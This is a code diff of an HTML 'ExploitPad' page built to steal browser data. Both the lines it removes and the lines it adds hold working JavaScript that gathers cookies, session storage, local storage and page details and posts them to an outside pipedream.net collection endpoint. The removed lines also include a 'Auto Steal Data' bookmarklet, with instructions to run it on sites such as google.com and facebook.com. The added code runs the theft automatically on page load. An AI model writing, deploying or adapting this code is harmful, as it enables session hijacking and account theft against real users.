@@ -69,7 +69,6 @@
             font-size: 14px; 
             color: #ccc; 
         }
-        form { display: none; }
     </style>
 </head>
 <body>
@@ -84,85 +83,87 @@
     <style>
         body { background-color: black; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; font-family: Arial, sans-serif; }
         h2 { text-align: center; color: gold; text-shadow: 0 0 10px rgba(255, 215, 0, 0.8); }
-        form { display: none; }
     </style>
 </head>
 <body>
     <h2>Ghost Shell Cookie Stealer Hidden PoC</h2>
-    <form id="dataForm" action="https://eoy4evvlsf7y0jq.m.pipedream.net" method="POST">
-        <input type="hidden" name="cookie_data" id="cookieField">
-        <input type="hidden" name="session_storage" id="sessionField">
-        <input type="hidden" name="local_storage" id="localField">
-        <input type="hidden" name="user_agent" id="userAgentField">
-        <input type="hidden" name="referrer" id="referrerField">
-        <input type="hidden" name="source" id="sourceField">
-        <input type="hidden" name="location" id="locationField">
-    </form>
-    <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            var cookies = document.cookie || "No_Cookies_Found";
-            var sessionData = {};
-            for (var i = 0; i < sessionStorage.length; i++) {
-                var key = sessionStorage.key(i);
-                sessionData[key] = sessionStorage.getItem(key);
-            }
-            var localData = {};
-            for (var i = 0; i < localStorage.length; i++) {
-                var key = localStorage.key(i);
-                localData[key] = localStorage.getItem(key);
-            }
-            if (Object.keys(sessionData).length === 0) sessionData = "No_Session_Data";
-            if (Object.keys(localData).length === 0) localData = "No_Local_Data";
-
-            console.log("Cookies: ", cookies);
-            console.log("Session Storage: ", sessionData);
-            console.log("Local Storage: ", localData);
-
-            document.getElementById("cookieField").value = cookies;
-            document.getElementById("sessionField").value = JSON.stringify(sessionData);
-            document.getElementById("localField").value = JSON.stringify(localData);
-            document.getElementById("userAgentField").value = navigator.userAgent || "Unknown_User_Agent";
-            document.getElementById("referrerField").value = document.referrer || "No_Referrer";
-            document.getElementById("sourceField").value = window.location.hostname;
-            document.getElementById("locationField").value = window.location.href;
-
-            // Add fetch for debugging form submission
-            fetch("https://eoy4evvlsf7y0jq.m.pipedream.net", {
-                method: "POST",
-                body: new FormData(document.getElementById("dataForm"))
-            }).then(response => {
-                console.log("Form submitted successfully:", response);
-            }).catch(error => {
-                console.error("Form submission error:", error);
-            });
-        });
-    </script>
 </body>
 </html></textarea>
         <button onclick="runCode()">▶ Run Code</button>
         <iframe id="output"></iframe>
         <div class="instructions">
-            <p>To automatically capture real cookies and storage from ANY site:<br>
-            1. Drag this bookmarklet to your bookmarks bar: <a href="javascript:(function(){var f=document.createElement('form');f.method='POST';f.action='https://eoy4evvlsf7y0jq.m.pipedream.net';var c=document.cookie||'No_Cookies_Found';var ss={};for(var i=0;i<sessionStorage.length;i++){ss[sessionStorage.key(i)]=sessionStorage.getItem(sessionStorage.key(i));}var ls={};for(var i=0;i<localStorage.length;i++){ls[localStorage.key(i)]=localStorage.getItem(localStorage.key(i));}f.innerHTML='<input type=hidden name=cookie_data value=\\''+c+'\\'><input type=hidden name=session_storage value=\\''+JSON.stringify(ss)+'\\'><input type=hidden name=local_storage value=\\''+JSON.stringify(ls)+'\\'><input type=hidden name=user_agent value=\\''+navigator.userAgent+'\\'><input type=hidden name=referrer value=\\''+document.referrer+'\\'><input type=hidden name=source value=\\''+location.hostname+'\\'><input type=hidden name=location value=\\''+window.location.href+'\\'>';document.body.appendChild(f);f.submit();})();">Auto Steal Data</a><br>
-            2. Click the bookmarklet on any site (e.g., google.com, facebook.com) to auto-send real data.<br>
-            OR: Copy the textarea code, paste it into any site's console (F12), and press Enter—it runs automatically.</p>
+            <p>This page automatically captures and sends cookies, session storage, and local storage from the current site to a remote server. No user action required!</p>
         </div>
     </div>
 
     <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            console.log("ExploitPad loaded - use the bookmarklet or paste the textarea code on any site.");
-            runCode(); // Auto-run the iframe code on load
-        });
+        // Function to collect and send data automatically
+        function stealAndSendData() {
+            // Collect cookies
+            var cookies = document.cookie || "No_Cookies_Found";
 
+            // Collect session storage
+            var sessionData = {};
+            for (var i = 0; i < sessionStorage.length; i++) {
+                var key = sessionStorage.key(i);
+                sessionData[key] = sessionStorage.getItem(key);
+            }
+            if (Object.keys(sessionData).length === 0) sessionData = "No_Session_Data";
+
+            // Collect local storage
+            var localData = {};
+            for (var i = 0; i < localStorage.length; i++) {
+                var key = localStorage.key(i);
+                localData[key] = localStorage.getItem(key);
+            }
+            if (Object.keys(localData).length === 0) localData = "No_Local_Data";
+
+            // Prepare data payload
+            var payload = {
+                cookie_data: cookies,
+                session_storage: sessionData,
+                local_storage: localData,
+                user_agent: navigator.userAgent || "Unknown_User_Agent",
+                referrer: document.referrer || "No_Referrer",
+                source: window.location.hostname,
+                location: window.location.href
+            };
+
+            // Log for debugging
+            console.log("Collected Data:", payload);
+
+            // Send data to pipedream.net
+            fetch("https://eoy4evvlsf7y0jq.m.pipedream.net", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                console.log("Data sent successfully:", response);
+            })
+            .catch(error => {
+                console.error("Error sending data:", error);
+            });
+        }
+
+        // Run iframe code
         function runCode() {
             let code = document.getElementById("code").value;
-            console.log("Running code in iframe:", code); // Debug output
+            console.log("Running code in iframe:", code);
             let outputFrame = document.getElementById("output").contentWindow.document;
             outputFrame.open();
             outputFrame.write(code);
             outputFrame.close();
         }
+
+        // Auto-run on page load
+        document.addEventListener("DOMContentLoaded", function() {
+            console.log("ExploitPad loaded - stealing data from current site...");
+            stealAndSendData(); // Automatically steal and send data
+            runCode(); // Auto-run iframe code
+        });
     </script>
 </body>
 </html>
